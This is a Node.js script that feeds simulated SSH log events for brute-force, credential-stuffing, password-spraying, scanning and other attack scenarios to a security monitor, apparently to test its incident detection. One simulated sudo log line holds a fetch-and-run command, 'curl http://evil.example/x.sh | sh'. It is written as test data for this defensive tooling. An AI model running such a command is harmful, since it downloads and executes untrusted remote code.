#!/usr/bin/env node
// Fake SSH agent: sends every event type and every attack pattern to a monitor.
//
//   node tools/simulate.js --url http://localhost:5000 --key sk_YOUR_TEST_KEY
//   node tools/simulate.js --url https://your-host --key sk_TEST_KEY_1,sk_TEST_KEY_2 --scenario cross_host
//   node tools/simulate.js --key sk_YOUR_TEST_KEY --live        (endless trickle of mixed events, Ctrl+C to stop)
//   node tools/simulate.js --list
//   node tools/simulate.js                 (no arguments: it asks for the URL and the API key)
//
// Use a DEDICATED test server's key (create one in Get Key). The bot does NOT send a
// hostname, so the server keeps the name you gave it in the dashboard - sending one would
// overwrite it (that's how a real agent is meant to report its actual machine name).
// Source IPs come from the reserved documentation ranges (RFC 5737), so they never hit a real host.

const args = process.argv.slice(2);
const opt = (name, def) => {
  const i = args.indexOf("--" + name);
  return i === -1 ? def : args[i + 1] && !args[i + 1].startsWith("--") ? args[i + 1] : true;
};
const DEFAULT_URL = "http://localhost:5000";
const cleanUrl = (u) => String(u).trim().replace(/\/+$/, "");
const parseKeys = (s) => String(s).split(/[,\s]+/).map((k) => k.replace(/^["']|["']$/g, "").replace(/^Bearer$/i, "")).filter(Boolean);
const URL_GIVEN = opt("url", null) !== null && opt("url", null) !== true;
let URL_BASE = cleanUrl(URL_GIVEN ? opt("url") : DEFAULT_URL);
let KEYS = parseKeys(opt("key", process.env.MONITOR_API_KEY || ""));
const ONLY = opt("scenario", "all");
const LIVE = opt("live", false) === true;
const PAUSE = Number(opt("pause", 700));

const MIN = 60000;
const run = Math.floor(Math.random() * 200) + 20; // unique per run so each run opens fresh incidents
const ip = (range, last) => `${range}.${last ?? run}`;
const NET = { a: "203.0.113", b: "198.51.100", c: "192.0.2" };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const T = (minAgo) => new Date(Date.now() - minAgo * MIN).toISOString();

const SEV = { ssh_login_failed: "warning", ssh_invalid_user: "high", connection_closed_preauth: "low" };
const ev = (minAgo, type, user, addr, extra = {}) => ({
  timestamp: typeof minAgo === "string" ? minAgo : T(minAgo),
  event_type: type,
  username: user || undefined,
  ip_address: addr || undefined,
  port: String(20000 + Math.floor(Math.random() * 40000)),
  severity: SEV[type] || "info",
  ...extra,
});

async function send(hostIdx, logs) {
  const key = KEYS[hostIdx % KEYS.length];
  let res;
  try {
    res = await fetch(URL_BASE + "/api/logs", {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: "Bearer " + key },
      // No "hostname" field on purpose - see the note above the require() block.
    body: JSON.stringify({ agent_version: "sim", timestamp: new Date().toISOString(), logs }),
      signal: AbortSignal.timeout(60000),
    });
  } catch (e) {
    const why = (e.cause && (e.cause.code || e.cause.message)) || e.message;
    throw new Error(`cannot reach ${URL_BASE} (${why}). Is the server running / is the URL right? (Render free may need ~60s to wake up)`);
  }
  if (res.status === 401) throw new Error("API key rejected (401) - copy the key of a server from Get Key");
  if (!res.ok) throw new Error(`HTTP ${res.status} ${await res.text()}`);
  return logs.length;
}

/* ---------------- Scenarios (order matters: later ones build on earlier ones) ---------------- */
const scenarios = [
  {
    name: "baseline",
    desc: "Every plain event type: login success (password + key), sudo, session closed, one typo'd password",
    hosts: 1,
    build: () => {
      const l = [];
      for (let i = 0; i < 4; i++) l.push(ev(600 - i * 90, "ssh_login_success", "alice", "10.0.4.21", { auth_method: i % 2 ? "publickey" : "password" }));
      l.push(ev(40, "sudo_command", "alice", null, { message: "sudo /usr/bin/apt update" }));
      l.push(ev(39, "session_closed", "alice", null));
      l.push(ev(12, "ssh_login_failed", "bob", "10.0.4.30")); // one typo...
      l.push(ev(11, "ssh_login_success", "bob", "10.0.4.30")); // ...then fine -> must NOT become an incident
      return { 0: l };
    },
    expect: "No incident (a typo followed by a login is normal).",
  },
  {
    name: "brute_force",
    desc: "Many wrong passwords against one account from one IP, no success",
    hosts: 1,
    build: () => ({ 0: Array.from({ length: 24 }, (_, i) => ev(6 - i * 0.2, "ssh_login_failed", "webadmin", ip(NET.a, run))) }),
    expect: "Brute force, risk MEDIUM (>=5) / HIGH (>=20).",
  },
  {
    name: "brute_force_success",
    desc: "Wrong passwords, then a successful login from the same IP, then sudo",
    hosts: 1,
    build: () => {
      const a = ip(NET.a, run + 1);
      const l = Array.from({ length: 9 }, (_, i) => ev(14 - i * 0.4, "ssh_login_failed", "root", a));
      l.push(ev(9, "ssh_login_success", "root", a, { auth_method: "password" }));
      l.push(ev(8, "sudo_command", "root", null, { message: "sudo /bin/bash -c 'curl http://evil.example/x.sh | sh'" }));
      return { 0: l };
    },
    expect: "CRITICAL: login after many failures + post-compromise privileged activity.",
  },
  {
    name: "username_enumeration",
    desc: "Dozens of non-existent usernames from one IP",
    hosts: 1,
    build: () => {
      const names = ["admin1", "test", "oracle", "postgres", "ubuntu", "git", "ftp", "user", "guest", "pi", "mysql", "nagios", "jenkins", "tomcat", "support", "info", "demo", "backup", "dev", "web", "deploy9", "vagrant"];
      return { 0: names.map((u, i) => ev(5 - i * 0.15, "ssh_invalid_user", u, ip(NET.b, run))) };
    },
    expect: "Username enumeration, HIGH (>=20 usernames).",
  },
  {
    name: "password_spraying",
    desc: "Few tries per real account, spread across many accounts, slowly",
    hosts: 1,
    build: () => {
      const a = ip(NET.b, run + 1);
      const l = [];
      ["alice", "deploy", "ubuntu", "admin", "www-data", "backup"].forEach((u, i) => {
        l.push(ev(52 - i * 7, "ssh_login_failed", u, a), ev(50 - i * 7, "ssh_login_failed", u, a));
      });
      return { 0: l };
    },
    expect: "Password spraying, HIGH (6 accounts x 2 tries over ~50 min).",
  },
  {
    name: "credential_stuffing",
    desc: "A leaked list: many accounts tried once each, quickly; one of them works",
    hosts: 1,
    build: () => {
      const a = ip(NET.c, run);
      const users = ["john", "mary", "deploy", "git", "jenkins", "oracle", "mysql", "test", "guest", "pi", "support", "dev", "ops", "sales", "hr"];
      const l = users.map((u, i) => ev(20 - i * 0.3, i % 4 === 3 ? "ssh_invalid_user" : "ssh_login_failed", u, a));
      l.push(ev(14, "ssh_login_success", "deploy", a, { auth_method: "password" }));
      return { 0: l };
    },
    expect: 'CRITICAL credential stuffing, account "deploy" marked compromised.',
  },
  {
    name: "compromised_account",
    desc: 'Account "deploy" (breached above) now attacked from other IPs, one succeeds',
    hosts: 1,
    build: () => ({
      0: [
        ev(6, "ssh_login_failed", "deploy", ip(NET.a, run + 10)),
        ev(4, "ssh_login_failed", "deploy", ip(NET.a, run + 11)),
        ev(3, "ssh_login_success", "deploy", ip(NET.a, run + 11), { auth_method: "password" }),
      ],
    }),
    expect: "CRITICAL repeated attempts on a compromised account (needs credential_stuffing run first).",
  },
  {
    name: "ssh_scanning",
    desc: "Connections dropped before authentication (port scanner / fingerprinting)",
    hosts: 1,
    build: () => ({ 0: Array.from({ length: 16 }, (_, i) => ev(7 - i * 0.3, "connection_closed_preauth", null, ip(NET.c, run + 2))) }),
    expect: "SSH scanning, MEDIUM (>=10) / HIGH (>=50).",
  },
  {
    name: "abnormal_burst",
    desc: "25+ events from one IP inside one minute (automated tooling)",
    hosts: 1,
    build: () => {
      const a = ip(NET.a, run + 3);
      return { 0: Array.from({ length: 28 }, (_, i) => ev(new Date(Date.now() - 4 * MIN + i * 1500).toISOString(), "ssh_login_failed", "scanner", a)) };
    },
    expect: "Abnormal source behavior: burst, HIGH.",
  },
  {
    name: "new_source_login",
    desc: 'Known user "alice" logs in from an IP never seen before',
    hosts: 1,
    build: () => ({ 0: [ev(1, "ssh_login_success", "alice", ip(NET.b, run + 4), { auth_method: "password" })] }),
    expect: "Login from new source, MEDIUM (HIGH if 00:00-05:59 Bangkok time or the IP attacked before).",
  },
  {
    name: "cross_host",
    desc: "One attacker IP probes several of your servers (needs 2+ keys: --key k1,k2)",
    hosts: 2,
    build: () => {
      const a = ip(NET.b, run + 5);
      return {
        0: [ev(9, "ssh_login_failed", "operator", a), ev(8.5, "ssh_login_failed", "svc", a), ev(8, "connection_closed_preauth", null, a)],
        1: [ev(7, "ssh_invalid_user", "postgres", a), ev(6.5, "ssh_login_failed", "operator", a)],
      };
    },
    expect: "Cross-host campaign, HIGH, one incident per server.",
  },
];

const LIVE_POOL = [
  () => ev(0, "ssh_login_success", ["alice", "bob", "carol"][Math.floor(Math.random() * 3)], "10.0.4." + (20 + Math.floor(Math.random() * 5))),
  () => ev(0, "ssh_login_failed", ["root", "admin", "ubuntu"][Math.floor(Math.random() * 3)], ip(NET.a, 1 + Math.floor(Math.random() * 250))),
  () => ev(0, "ssh_invalid_user", "user" + Math.floor(Math.random() * 99), ip(NET.b, 1 + Math.floor(Math.random() * 250))),
  () => ev(0, "connection_closed_preauth", null, ip(NET.c, 1 + Math.floor(Math.random() * 250))),
  () => ev(0, "sudo_command", "alice", null, { message: "sudo systemctl restart nginx" }),
  () => ev(0, "session_closed", "alice", null),
];

/* ---------------- Prompts (used when --url / --key are not given) ---------------- */
const readline = require("readline");
let rl = null;
const queued = [];
let waiting = null;
let inputClosed = false;
// Lines are queued as they arrive, so pasted/piped answers are never dropped between questions
function ask(question) {
  if (!rl) {
    rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.on("line", (line) => {
      if (waiting) { const w = waiting; waiting = null; w(line.trim()); } else queued.push(line.trim());
    });
    rl.on("close", () => {
      inputClosed = true;
      if (waiting) { const w = waiting; waiting = null; w(""); }
    });
  }
  if (!inputClosed) { rl.setPrompt(question); rl.prompt(); }
  if (queued.length) return Promise.resolve(queued.shift());
  if (inputClosed) return Promise.resolve("");
  return new Promise((resolve) => { waiting = resolve; });
}

async function promptForSettings() {
  let askedKey = false;
  if (!URL_GIVEN) {
    const u = await ask(`Monitor URL [${DEFAULT_URL}] (Enter = local; Render: https://<your-service>.onrender.com): `);
    if (u) {
      const local = /^(localhost|127\.|10\.|192\.168\.|\[?::1)/i.test(u);
      URL_BASE = cleanUrl(/^https?:\/\//i.test(u) ? u : (local ? "http://" : "https://") + u);
    }
  }
  if (!KEYS.length) {
    console.log("\nCreate a DEDICATED test server in the dashboard (Get Key) and copy its API key.");
    KEYS = parseKeys(await ask("API key (several allowed, separated by commas): "));
    askedKey = true;
  }
  if (askedKey && KEYS.length === 1 && (ONLY === "all" || ONLY === "cross_host")) {
    const second = parseKeys(await ask("Second test server's API key for the cross-host scenario (Enter to skip): "));
    KEYS.push(...second);
  }
  console.log("");
}

/* ---------------- Main ---------------- */
async function main() {
  if (args.includes("--list")) {
    console.log("Scenarios:\n" + scenarios.map((s) => `  ${s.name.padEnd(22)} ${s.desc}`).join("\n"));
    return;
  }
  if (!URL_GIVEN || !KEYS.length) await promptForSettings();
  if (rl) rl.close();
  if (!KEYS.length) {
    console.error("No API key entered. Create a test server in the dashboard (Get Key), then run again.");
    process.exit(1);
  }

  if (LIVE) {
    console.log(`Live mode -> ${URL_BASE}  (Ctrl+C to stop)`);
    for (let n = 0; ; n++) {
      const batch = Array.from({ length: 1 + Math.floor(Math.random() * 4) }, () => LIVE_POOL[Math.floor(Math.random() * LIVE_POOL.length)]());
      try { await send(n, batch); console.log(new Date().toLocaleTimeString(), "sent", batch.map((b) => b.event_type).join(", ")); }
      catch (e) { console.error("send failed:", e.message); }
      await sleep(2000 + Math.random() * 3000);
    }
  }

  const chosen = ONLY === "all" ? scenarios : scenarios.filter((s) => s.name === ONLY);
  if (!chosen.length) { console.error(`Unknown scenario "${ONLY}". Use --list.`); process.exit(1); }

  console.log(`Target: ${URL_BASE}   servers (keys): ${KEYS.length}   run id: ${run}\n`);
  let sent = 0, skipped = 0;
  for (const s of chosen) {
    if (s.hosts > KEYS.length) {
      console.log(`SKIP  ${s.name.padEnd(22)} needs ${s.hosts} API keys (pass --key k1,k2)`);
      skipped++;
      continue;
    }
    try {
      let n = 0;
      for (const [host, logs] of Object.entries(s.build())) n += await send(Number(host), logs);
      sent += n;
      console.log(`OK    ${s.name.padEnd(22)} ${String(n).padStart(3)} events   -> ${s.expect}`);
    } catch (e) {
      console.log(`FAIL  ${s.name.padEnd(22)} ${e.message}`);
    }
    await sleep(PAUSE);
  }
  console.log(`\nDone: ${sent} events sent, ${skipped} scenario(s) skipped. Open the dashboard (Incidents / Dashboard) to see the results.`);
}

main().catch((e) => { console.error(e.message); process.exit(1); });
